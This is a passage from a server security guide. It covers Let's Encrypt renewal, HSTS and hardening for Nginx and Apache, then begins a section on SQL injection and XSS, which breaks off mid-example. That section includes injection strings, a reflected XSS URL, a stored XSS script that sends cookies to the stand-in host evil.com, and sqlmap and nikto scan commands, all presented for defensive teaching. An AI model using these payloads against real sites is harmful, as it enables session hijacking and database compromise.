    Redirect permanent / https://yourdomain.com/
</VirtualHost>
```

```bash
# Enable SSL site
sudo a2ensite yourdomain.com-le-ssl.conf

# Test and reload
sudo apache2ctl configtest
sudo systemctl reload apache2
```

---

## Certificate Renewal

### Automatic Renewal
Certbot automatically creates a systemd timer for renewal:

```bash
# Check renewal timer status
sudo systemctl status certbot.timer

# List timers
sudo systemctl list-timers | grep certbot

# View renewal configuration
sudo cat /etc/cron.d/certbot
# Or: sudo cat /lib/systemd/system/certbot.timer
```

### Test Automatic Renewal
```bash
# Dry run (test renewal without actually renewing)
sudo certbot renew --dry-run

# This simulates renewal and checks for issues
```

### Manual Renewal
```bash
# Renew all certificates
sudo certbot renew

# Renew specific certificate
sudo certbot renew --cert-name yourdomain.com

# Force renewal (even if not near expiry)
sudo certbot renew --force-renewal
```

### Renewal Hooks
Create scripts to run before/after renewal:

```bash
# Pre-hook (runs before renewal)
sudo nano /etc/letsencrypt/renewal-hooks/pre/backup.sh
```

```bash
#!/bin/bash
# Backup certificates before renewal
tar -czf /backup/letsencrypt-$(date +%Y%m%d).tar.gz /etc/letsencrypt/
```

```bash
# Post-hook (runs after successful renewal)
sudo nano /etc/letsencrypt/renewal-hooks/post/reload-services.sh
```

```bash
#!/bin/bash
# Reload web server after renewal
systemctl reload nginx
# Or: systemctl reload apache2
```

```bash
# Make hooks executable
sudo chmod +x /etc/letsencrypt/renewal-hooks/pre/backup.sh
sudo chmod +x /etc/letsencrypt/renewal-hooks/post/reload-services.sh
```

---

## Verification and Testing

### Test SSL Certificate
```bash
# Check certificate expiration
sudo certbot certificates

# View certificate details
openssl x509 -in /etc/letsencrypt/live/yourdomain.com/fullchain.pem -text -noout

# Check expiration date
openssl x509 -in /etc/letsencrypt/live/yourdomain.com/fullchain.pem -noout -dates
```

### Online SSL Testing Tools
- **SSL Labs**: https://www.ssllabs.com/ssltest/
  - Comprehensive SSL/TLS analysis
  - Should achieve A+ rating with recommended config

- **Security Headers**: https://securityheaders.com/
  - Tests HTTP security headers
  - Should achieve A+ with HSTS and other headers

### Test HTTPS in Browser
```bash
# Visit your site
https://yourdomain.com

# Verify:
# - Lock icon appears
# - Certificate is valid
# - Issued by Let's Encrypt
# - HTTP redirects to HTTPS
```

---

## HTTP Strict Transport Security (HSTS)

### What is HSTS?
HSTS tells browsers to ONLY connect via HTTPS, even if user types http://. Provides protection against SSL stripping attacks and cookie hijacking.

### Implementation (Already in configs above)
```nginx
# Nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

```apache
# Apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```

### HSTS Parameters Explained
- `max-age=31536000` - Cache for 1 year (seconds)
- `includeSubDomains` - Apply to all subdomains
- `preload` - Eligible for browser preload list

### HSTS Preload List
Submit your domain to be hardcoded in browsers:
- Visit: https://hstspreload.org/
- Requires HSTS header with preload directive
- Commitment is permanent (difficult to remove)

---

## Multiple Domains and Wildcard Certificates

### Multiple Domains
```bash
# Single certificate for multiple domains
sudo certbot --nginx -d example.com -d www.example.com -d api.example.com -d blog.example.com
```

### Wildcard Certificates
Requires DNS validation (not HTTP):

```bash
# Obtain wildcard certificate
sudo certbot certonly --manual --preferred-challenges dns -d '*.yourdomain.com' -d yourdomain.com

# Follow prompts to add DNS TXT records
# Certbot will provide specific TXT record values
# Add to DNS: _acme-challenge.yourdomain.com

# Verify DNS propagation before continuing
nslookup -type=TXT _acme-challenge.yourdomain.com
```

---

## Troubleshooting

### Common Issues

#### Port 80/443 Not Accessible
```bash
# Check firewall
sudo ufw status

# Allow if blocked
sudo ufw allow 'Nginx Full'
```

#### Certificate Renewal Fails
```bash
# Check renewal logs
sudo tail -f /var/log/letsencrypt/letsencrypt.log

# Common causes:
# - Firewall blocking port 80
# - Web server misconfigured
# - DNS not pointing to server
# - Rate limits exceeded
```

#### Rate Limits
Let's Encrypt has rate limits:
- 50 certificates per registered domain per week
- 5 duplicate certificates per week

```bash
# Check rate limits for your domain
# Visit: https://crt.sh/?q=yourdomain.com
```

### Certificate Revocation
```bash
# Revoke certificate if compromised
sudo certbot revoke --cert-path /etc/letsencrypt/live/yourdomain.com/fullchain.pem

# Delete certificate
sudo certbot delete --cert-name yourdomain.com
```

---

## Best Practices

1. **Use HTTP/2**: Enabled in config examples above
2. **Enable OCSP Stapling**: Improves SSL performance
3. **Set HSTS Headers**: Force HTTPS
4. **Monitor Expiration**: Certificates expire every 90 days
5. **Test Renewals**: Run dry-run regularly
6. **Keep Backups**: Backup /etc/letsencrypt/ directory
7. **Use Strong Ciphers**: Follow Mozilla SSL Configuration Generator
8. **Disable Old Protocols**: Only TLS 1.2 and 1.3
9. **Implement Security Headers**: As shown in configs
10. **Regular Testing**: Use SSL Labs quarterly

---

## 8. Web Server Security

This section covers hardening for both Nginx and Apache web servers. Choose the section relevant to your setup.

---

## Nginx Security Hardening

### Overview
Nginx is lightweight, high-performance, and widely used. However, default configurations need hardening for production environments. The following measures dramatically reduce attack surface while maintaining performance.

---

### 1. Hide Nginx Version (Essential)

**Why**: Server version disclosure helps attackers identify known vulnerabilities.

```bash
# Edit main Nginx config
sudo nano /etc/nginx/nginx.conf
```

```nginx
http {
    # Hide Nginx version in error pages and headers
    server_tokens off;

    # ... rest of config
}
```

**Test:**
```bash
curl -I https://yourdomain.com
# Should NOT show: Server: nginx/1.18.0
# Should show: Server: nginx
```

---

### 2. SSL/TLS Configuration (Critical)

**Use only modern TLS protocols and strong ciphers:**

```nginx
# In server block (or separate ssl.conf)
ssl_protocols TLSv1.2 TLSv1.3;

# Strong cipher suite (Mozilla Intermediate compatibility)
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;

# Let client choose cipher (modern approach)
ssl_prefer_server_ciphers off;

# SSL session optimization
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
ssl_session_tickets off;

# OCSP Stapling (improves performance & privacy)
ssl_stapling on;
ssl_stapling_verify on;
ssl_trusted_certificate /etc/letsencrypt/live/yourdomain.com/chain.pem;
resolver 8.8.8.8 8.8.4.4 valid=300s;
resolver_timeout 5s;
```

**Generate strong DH parameters (one-time):**
```bash
# Generate 2048-bit DH parameters (takes several minutes)
sudo openssl dhparam -out /etc/nginx/dhparam.pem 2048

# Add to SSL config
ssl_dhparam /etc/nginx/dhparam.pem;
```

---

### 3. Security Headers (Critical)

**Add essential security headers to protect against common attacks:**

```nginx
# In server block
server {
    # ... SSL config ...

    # HTTP Strict Transport Security (HSTS)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # Prevent clickjacking attacks
    add_header X-Frame-Options "SAMEORIGIN" always;

    # Prevent MIME type sniffing
    add_header X-Content-Type-Options "nosniff" always;

    # XSS Protection (legacy browsers)
    add_header X-XSS-Protection "1; mode=block" always;

    # Referrer Policy
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Content Security Policy (CSP) - adjust for your needs
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'self';" always;

    # Permissions Policy (formerly Feature-Policy)
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
}
```

**Note**: CSP is complex - start permissive and tighten based on your application needs.

---

### 4. Rate Limiting (DDoS Protection)

**Protect against brute force and abuse:**

```nginx
# In http block
http {
    # Define rate limit zone
    # 10MB zone, tracks IPs, limit 1 request/second
    limit_req_zone $binary_remote_addr zone=general:10m rate=1r/s;

    # Limit for login endpoints
    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

    # Connection limit per IP
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    # ... rest of config
}

# In server block
server {
    # Apply general rate limit (allow burst of 5)
    limit_req zone=general burst=5 nodelay;

    # Limit concurrent connections per IP
    limit_conn addr 10;

    # Protect login/admin areas specifically
    location /admin {
        limit_req zone=login burst=2 nodelay;
        # ... other config
    }

    location /wp-login.php {
        limit_req zone=login burst=2 nodelay;
    }
}
```

---

### 5. Buffer Overflow Protection

**Prevent buffer overflow attacks:**

```nginx
# In http block
http {
    # Buffer size limits
    client_body_buffer_size 1K;
    client_header_buffer_size 1k;
    client_max_body_size 1k;  # Increase for file uploads
    large_client_header_buffers 2 1k;

    # Timeouts
    client_body_timeout 10;
    client_header_timeout 10;
    keepalive_timeout 5 5;
    send_timeout 10;
}
```

**For sites with file uploads, increase limits:**
```nginx
location /upload {
    client_max_body_size 10M;  # Max 10MB upload
}
```

---

### 6. Disable Unsafe HTTP Methods

**Allow only necessary HTTP methods:**

```nginx
# In server block
server {
    # Only allow GET, HEAD, POST
    if ($request_method !~ ^(GET|HEAD|POST)$ ) {
        return 405;
    }
}
```

**For APIs that need PUT/DELETE:**
```nginx
location /api {
    if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$ ) {
        return 405;
    }
}
```

---

### 7. IP Whitelisting for Admin Areas

**Restrict access to sensitive areas:**

```nginx
# Protect admin area
location /admin {
    # Allow specific IPs
    allow 203.0.113.10;
    allow 203.0.113.0/24;

    # Block all others
    deny all;

    # ... rest of location config
}

# Protect sensitive files
location ~ /\.git {
    deny all;
}

location ~ /\.env {
    deny all;
}
```

---

### 8. Disable Directory Listing

**Prevent directory browsing:**

```nginx
# In server block
server {
    autoindex off;

    # ... rest of config
}
```

---

### 9. ModSecurity WAF Integration

**Add Web Application Firewall for advanced protection:**

```bash
# Install ModSecurity
sudo apt install libnginx-mod-security2 -y

# Download OWASP Core Rule Set
sudo git clone https://github.com/coreruleset/coreruleset /usr/share/modsecurity-crs

# Copy recommended config
sudo cp /usr/share/modsecurity-crs/crs-setup.conf.example /usr/share/modsecurity-crs/crs-setup.conf

# Enable ModSecurity
sudo nano /etc/nginx/modsec/main.conf
```

```nginx
# Enable ModSecurity
SecRuleEngine On

# Include OWASP CRS
Include /usr/share/modsecurity-crs/crs-setup.conf
Include /usr/share/modsecurity-crs/rules/*.conf
```

```bash
# Enable in Nginx
sudo nano /etc/nginx/nginx.conf
```

```nginx
http {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}
```

---

### 10. Logging Configuration

**Enable comprehensive logging:**

```nginx
# In http block
http {
    # Access log format with more details
    log_format detailed '$remote_addr - $remote_user [$time_local] '
                       '"$request" $status $body_bytes_sent '
                       '"$http_referer" "$http_user_agent" '
                       '$request_time $upstream_response_time';

    # Enable access log
    access_log /var/log/nginx/access.log detailed;

    # Error log
    error_log /var/log/nginx/error.log warn;
}

# Log suspicious requests
server {
    # Log blocked requests
    location /admin {
        access_log /var/log/nginx/admin_access.log detailed;
        error_log /var/log/nginx/admin_error.log;
    }
}
```

---

### 11. Complete Hardened Nginx Configuration Example

**File: `/etc/nginx/nginx.conf`**

```nginx
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    multi_accept on;
}

http {
    ##
    # Basic Settings
    ##
    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    server_tokens off;

    # Buffer overflow protection
    client_body_buffer_size 1K;
    client_header_buffer_size 1k;
    client_max_body_size 1k;
    large_client_header_buffers 2 1k;

    # Timeouts
    client_body_timeout 10;
    client_header_timeout 10;
    keepalive_timeout 5 5;
    send_timeout 10;

    # Hide Nginx version
    server_tokens off;
    more_clear_headers 'Server';

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ##
    # SSL Settings
    ##
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    ssl_session_tickets off;
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 8.8.8.8 8.8.4.4 valid=300s;
    resolver_timeout 5s;

    ##
    # Logging Settings
    ##
    log_format detailed '$remote_addr - $remote_user [$time_local] '
                       '"$request" $status $body_bytes_sent '
                       '"$http_referer" "$http_user_agent" '
                       '$request_time';

    access_log /var/log/nginx/access.log detailed;
    error_log /var/log/nginx/error.log warn;

    ##
    # Rate Limiting
    ##
    limit_req_zone $binary_remote_addr zone=general:10m rate=1r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    ##
    # Gzip Settings
    ##
    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_types text/plain text/css text/xml text/javascript application/json application/javascript application/xml+rss application/rss+xml font/truetype font/opentype application/vnd.ms-fontobject image/svg+xml;
    gzip_disable "msie6";

    ##
    # Virtual Host Configs
    ##
    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}
```

**File: `/etc/nginx/sites-available/yourdomain.com`**

```nginx
# Redirect HTTP to HTTPS
server {
    listen 80;
    listen [::]:80;
    server_name yourdomain.com www.yourdomain.com;
    return 301 https://$server_name$request_uri;
}

# HTTPS server
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name yourdomain.com www.yourdomain.com;

    root /var/www/yourdomain.com;
    index index.html index.php;

    # SSL certificates
    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    ssl_trusted_certificate /etc/letsencrypt/live/yourdomain.com/chain.pem;
    ssl_dhparam /etc/nginx/dhparam.pem;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Disable directory listing
    autoindex off;

    # Rate limiting
    limit_req zone=general burst=5 nodelay;
    limit_conn addr 10;

    # Block HTTP methods
    if ($request_method !~ ^(GET|HEAD|POST)$ ) {
        return 405;
    }

    # Main location
    location / {
        try_files $uri $uri/ =404;
    }

    # Block access to hidden files
    location ~ /\. {
        deny all;
        access_log off;
        log_not_found off;
    }

    # PHP processing (if needed)
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    # Admin area protection
    location /admin {
        limit_req zone=login burst=2 nodelay;
        # IP whitelist
        # allow 203.0.113.10;
        # deny all;
    }

    # Logging
    access_log /var/log/nginx/yourdomain_access.log detailed;
    error_log /var/log/nginx/yourdomain_error.log;
}
```

---

### Test and Apply Configuration

```bash
# Test Nginx configuration
sudo nginx -t

# If OK, reload Nginx
sudo systemctl reload nginx

# Check status
sudo systemctl status nginx

# Monitor logs
sudo tail -f /var/log/nginx/error.log
```

---

## Apache Security Hardening

### Overview
Apache is the most widely-used web server with extensive modules and flexibility. However, it requires careful hardening for production environments.

---

### 1. Hide Apache Version and OS

**Edit Apache security config:**

```bash
sudo nano /etc/apache2/conf-enabled/security.conf
```

```apache
# Hide version and OS information
ServerTokens Prod
ServerSignature Off

# TraceEnable to prevent TRACE method
TraceEnable Off
```

**Or for Ubuntu, main config:**
```bash
sudo nano /etc/apache2/apache2.conf
```

```apache
ServerTokens Prod
ServerSignature Off
TraceEnable Off
```

---

### 2. Disable Unnecessary Modules

**List enabled modules:**
```bash
apache2ctl -M
```

**Disable dangerous/unused modules:**
```bash
# Disable mod_status (shows server info)
sudo a2dismod status

# Disable mod_info (shows configuration)
sudo a2dismod info

# Disable WebDAV (if not needed)
sudo a2dismod dav
sudo a2dismod dav_fs

# Disable mod_autoindex (directory listing)
sudo a2dismod autoindex

# Common modules to keep enabled:
# - ssl (for HTTPS)
# - rewrite (for URL rewriting)
# - headers (for security headers)
# - expires (for caching)
```

**Enable essential security modules:**
```bash
sudo a2enmod ssl
sudo a2enmod rewrite
sudo a2enmod headers
sudo a2enmod expires
sudo a2enmod http2
```

---

### 3. SSL/TLS Configuration

**Install Certbot first (see SSL section above), then configure SSL:**

```bash
sudo nano /etc/apache2/sites-available/yourdomain.com-le-ssl.conf
```

```apache
<IfModule mod_ssl.c>
<VirtualHost *:443>
    ServerName yourdomain.com
    ServerAlias www.yourdomain.com
    ServerAdmin admin@yourdomain.com

    DocumentRoot /var/www/yourdomain.com

    # SSL Configuration
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/yourdomain.com/privkey.pem

    # Modern SSL protocols only
    SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1

    # Strong cipher suite
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384

    SSLHonorCipherOrder off
    SSLCompression off
    SSLSessionTickets off

    # OCSP Stapling
    SSLUseStapling on
    SSLStaplingCache "shmcb:logs/stapling-cache(150000)"

    # Security Headers (requires mod_headers)
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"

    # Directory configuration
    <Directory /var/www/yourdomain.com>
        Options -Indexes +FollowSymLinks -ExecCGI
        AllowOverride All
        Require all granted

        # Disable directory listing
        Options -Indexes
    </Directory>

    # Logging
    ErrorLog ${APACHE_LOG_DIR}/yourdomain_ssl_error.log
    CustomLog ${APACHE_LOG_DIR}/yourdomain_ssl_access.log combined
</VirtualHost>
</IfModule>

# HTTP to HTTPS redirect
<VirtualHost *:80>
    ServerName yourdomain.com
    ServerAlias www.yourdomain.com
    Redirect permanent / https://yourdomain.com/
</VirtualHost>
```

---

### 4. Security Headers

**Enable mod_headers if not already:**
```bash
sudo a2enmod headers
```

**Add to virtual host or create global config:**
```bash
sudo nano /etc/apache2/conf-available/security-headers.conf
```

```apache
<IfModule mod_headers.c>
    # HSTS Header
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

    # Prevent clickjacking
    Header always set X-Frame-Options "SAMEORIGIN"

    # Prevent MIME sniffing
    Header always set X-Content-Type-Options "nosniff"

    # XSS Protection
    Header always set X-XSS-Protection "1; mode=block"

    # Referrer Policy
    Header always set Referrer-Policy "strict-origin-when-cross-origin"

    # Content Security Policy
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;"

    # Permissions Policy
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
</IfModule>
```

```bash
# Enable configuration
sudo a2enconf security-headers

# Reload Apache
sudo systemctl reload apache2
```

---

### 5. Disable Directory Listing

**In main config or virtual host:**

```apache
<Directory /var/www/yourdomain.com>
    Options -Indexes +FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
```

**Or globally in apache2.conf:**
```bash
sudo nano /etc/apache2/apache2.conf
```

```apache
<Directory /var/www/>
    Options -Indexes +FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
```

---

### 6. Request Limits (DoS Protection)

**Edit security config:**
```bash
sudo nano /etc/apache2/conf-enabled/security.conf
```

```apache
# Timeout: seconds to wait for requests
Timeout 60

# KeepAlive: persistent connections
KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 5

# Limit request sizes
LimitRequestBody 1048576  # 1MB (increase for file uploads)
LimitRequestFields 100
LimitRequestFieldSize 1024
LimitRequestLine 2048

# For upload directories, set higher limit
<Directory /var/www/yourdomain.com/uploads>
    LimitRequestBody 10485760  # 10MB
</Directory>
```

---

### 7. Install ModSecurity (WAF)

**Install ModSecurity:**
```bash
sudo apt update
sudo apt install libapache2-mod-security2 -y

# Enable module
sudo a2enmod security2

# Restart Apache
sudo systemctl restart apache2
```

**Configure ModSecurity:**
```bash
# Copy recommended config
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf

# Edit config
sudo nano /etc/modsecurity/modsecurity.conf
```

```apache
# Change from DetectionOnly to On
SecRuleEngine On

# Set other options as needed
SecRequestBodyAccess On
SecResponseBodyAccess On
SecRequestBodyLimit 13107200
SecRequestBodyNoFilesLimit 131072
```

**Install OWASP Core Rule Set:**
```bash
# Download OWASP CRS
sudo git clone https://github.com/coreruleset/coreruleset /etc/modsecurity/crs

# Copy setup file
sudo cp /etc/modsecurity/crs/crs-setup.conf.example /etc/modsecurity/crs/crs-setup.conf

# Enable rules
sudo nano /etc/apache2/mods-enabled/security2.conf
```

```apache
<IfModule security2_module>
    SecDataDir /var/cache/modsecurity
    IncludeOptional /etc/modsecurity/*.conf
    IncludeOptional /etc/modsecurity/crs/crs-setup.conf
    IncludeOptional /etc/modsecurity/crs/rules/*.conf
</IfModule>
```

```bash
# Restart Apache
sudo systemctl restart apache2
```

---

### 8. Install mod_evasive (DDoS Protection)

**Install mod_evasive:**
```bash
sudo apt install libapache2-mod-evasive -y

# Create log directory
sudo mkdir -p /var/log/mod_evasive
sudo chown www-data:www-data /var/log/mod_evasive
```

**Configure mod_evasive:**
```bash
sudo nano /etc/apache2/mods-enabled/evasive.conf
```

```apache
<IfModule mod_evasive20.c>
    DOSHashTableSize 3097
    DOSPageCount 2
    DOSSiteCount 50
    DOSPageInterval 1
    DOSSiteInterval 1
    DOSBlockingPeriod 10

    DOSEmailNotify your-email@example.com
    DOSLogDir "/var/log/mod_evasive"

    # Whitelist local IP
    DOSWhitelist 127.0.0.1
    # DOSWhitelist your.ip.address
</IfModule>
```

```bash
# Restart Apache
sudo systemctl restart apache2
```

---

### 9. Restrict Access to Sensitive Files

**Add to virtual host or .htaccess:**

```apache
# Block access to .htaccess
<Files .htaccess>
    Require all denied
</Files>

# Block access to .git
<DirectoryMatch "\.git">
    Require all denied
</DirectoryMatch>

# Block access to .env files
<Files .env>
    Require all denied
</Files>

# Block access to backup files
<FilesMatch "\.(bak|config|sql|fla|psd|ini|log|sh|inc|swp|dist)$">
    Require all denied
</FilesMatch>
```

---

### 10. IP-Based Access Control

**For admin areas:**

```apache
<Directory /var/www/yourdomain.com/admin>
    # Allow specific IPs only
    <RequireAny>
        Require ip 203.0.113.10
        Require ip 203.0.113.0/24
    </RequireAny>
</Directory>
```

**Or in .htaccess:**
```apache
Order Deny,Allow
Deny from all
Allow from 203.0.113.10
Allow from 203.0.113.0/24
```

---

### 11. HTTP Method Restrictions

**Restrict to safe methods:**

```apache
<Directory /var/www/yourdomain.com>
    <LimitExcept GET POST HEAD>
        Require all denied
    </LimitExcept>
</Directory>

# For APIs that need more methods
<Directory /var/www/yourdomain.com/api>
    <LimitExcept GET POST PUT DELETE OPTIONS>
        Require all denied
    </LimitExcept>
</Directory>
```

---

### 12. Run Apache as Dedicated User

**Create dedicated user:**
```bash
sudo useradd -r -s /bin/false apache-user
```

**Edit Apache config:**
```bash
sudo nano /etc/apache2/envvars
```

```bash
# Change from www-data to apache-user
export APACHE_RUN_USER=apache-user
export APACHE_RUN_GROUP=apache-user
```

**Update ownership:**
```bash
sudo chown -R apache-user:apache-user /var/www/yourdomain.com
sudo systemctl restart apache2
```

---

### 13. Logging Configuration

**Enhanced logging:**

```bash
sudo nano /etc/apache2/sites-available/yourdomain.com-le-ssl.conf
```

```apache
# Custom log format with more details
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %T" detailed

# Separate logs per virtual host
ErrorLog ${APACHE_LOG_DIR}/yourdomain_error.log
CustomLog ${APACHE_LOG_DIR}/yourdomain_access.log detailed

# Log SSL activity
CustomLog ${APACHE_LOG_DIR}/yourdomain_ssl_access.log detailed

# Set log level
LogLevel warn
```

---

### 14. Complete Hardened Apache Configuration

**Main config snippets:**

```bash
sudo nano /etc/apache2/apache2.conf
```

```apache
# Security settings
ServerTokens Prod
ServerSignature Off
TraceEnable Off
FileETag None

# Timeout settings
Timeout 60
KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 5

# Default deny access
<Directory />
    Options -Indexes -Includes -FollowSymLinks
    AllowOverride None
    Require all denied
</Directory>

# Web root
<Directory /var/www/>
    Options -Indexes +FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>

# Disable TRACE method
TraceEnable Off

# Load required modules
LoadModule ssl_module modules/mod_ssl.so
LoadModule headers_module modules/mod_headers.so
LoadModule rewrite_module modules/mod_rewrite.so
```

---

### Test and Apply Configuration

```bash
# Test Apache configuration
sudo apache2ctl configtest

# If OK (Syntax OK), restart Apache
sudo systemctl restart apache2

# Check status
sudo systemctl status apache2

# Monitor logs
sudo tail -f /var/log/apache2/error.log
```

---

## Web Server Security Best Practices Summary

### Both Nginx and Apache

1. **Hide version information**
2. **Use only TLS 1.2 and 1.3**
3. **Implement strong ciphers**
4. **Add security headers (HSTS, CSP, etc.)**
5. **Disable directory listing**
6. **Configure rate limiting**
7. **Implement WAF (ModSecurity)**
8. **Restrict HTTP methods**
9. **Block access to sensitive files**
10. **Enable comprehensive logging**
11. **Regular security updates**
12. **Test with SSL Labs and Security Headers**

### Security Testing

```bash
# Test SSL configuration
# Visit: https://www.ssllabs.com/ssltest/

# Test security headers
# Visit: https://securityheaders.com/

# Test with curl
curl -I https://yourdomain.com

# Check for version leakage
curl -I http://yourdomain.com/nonexistent
```

---

## 9. Common Attack Vectors and Prevention

### Overview
Cyber attacks cost the global economy over $10.5 trillion annually, with more than 2,200 incidents occurring daily - one attack every 39 seconds. Understanding common attack vectors and implementing preventive measures is critical for VPS security.

---

## Attack Vector 1: SQL Injection (SQLi)

### What is SQL Injection?
SQL injection is a code injection technique that exploits vulnerabilities in applications' database layer. Attackers insert malicious SQL statements into input fields to manipulate or access the database.

### Attack Example
```sql
-- Normal query
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';

-- Injected input: admin' OR '1'='1
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';
-- This bypasses authentication
```

### Impact
- Unauthorized access to sensitive data
- Data modification or deletion
- Complete database compromise
- Administrative access to application
- Data exfiltration

---

### Prevention Strategies

#### 1. Use Parameterized Queries (Prepared Statements)
```php
// VULNERABLE CODE (DON'T DO THIS)
$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";

// SECURE CODE (DO THIS)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
```

```python
# Python example with parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

```javascript
// Node.js with parameterized query
db.query('SELECT * FROM users WHERE username = ?', [username], callback);
```

#### 2. Input Validation and Sanitization
```php
// Whitelist validation
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username format");
}

// Escape special characters (use as additional layer, NOT primary defense)
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

#### 3. Use ORM (Object-Relational Mapping)
```python
# Django ORM (automatically uses parameterized queries)
User.objects.filter(username=username)

# SQLAlchemy
session.query(User).filter(User.username == username)
```

#### 4. Least Privilege Database Access
```sql
-- Create limited database user for application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp'@'localhost';

-- Don't grant DROP, CREATE, or administrative privileges
```

#### 5. Web Application Firewall (WAF)
```bash
# ModSecurity with OWASP CRS (already configured in Web Server section)
# Automatically blocks common SQL injection patterns

# Example blocked patterns:
# - UNION SELECT
# - ' OR 1=1
# - '; DROP TABLE
```

#### 6. Error Message Sanitization
```php
// DON'T show detailed database errors to users
// VULNERABLE:
die("Query failed: " . mysqli_error($conn));

// SECURE:
error_log("Database error: " . mysqli_error($conn));
die("An error occurred. Please try again later.");
```

#### 7. Regular Security Testing
```bash
# Use SQLMap for testing (on your own systems only)
sqlmap -u "http://yourdomain.com/page.php?id=1" --batch

# Automated vulnerability scanning
sudo apt install nikto -y
nikto -h http://yourdomain.com
```

---

## Attack Vector 2: Cross-Site Scripting (XSS)

### What is XSS?
XSS attacks inject malicious scripts into web pages viewed by other users. When executed, these scripts run in the context of the victim's browser.

### Types of XSS

#### Reflected XSS
```html
<!-- Vulnerable search page -->
<p>You searched for: <?php echo $_GET['query']; ?></p>

<!-- Malicious URL -->
http://example.com/search.php?query=<script>alert(document.cookie)</script>
```

#### Stored XSS
```html
<!-- Comment stored in database with script tag -->
<script>
    // Steal cookies and send to attacker
    new Image().src = "http://evil.com/steal.php?cookie=" + document.cookie;
</script>
```

#### DOM-based XSS
```javascript
// Vulnerable JavaScript
document.getElementById('output').innerHTML = location.hash.substring(1);

// Malicious URL
